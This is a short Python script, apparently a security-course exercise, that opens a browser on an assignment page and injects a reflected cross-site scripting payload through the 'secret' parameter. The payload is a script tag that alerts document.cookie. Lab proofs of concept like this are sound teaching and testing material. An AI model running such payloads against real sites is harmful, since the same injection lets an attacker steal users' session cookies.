import webbrowser

url = "http://www.wsb.com/Assignment2/case29.php?secret=\"/><script>alert(document.cookie);</script>"
new = 2
webbrowser.open(url, new)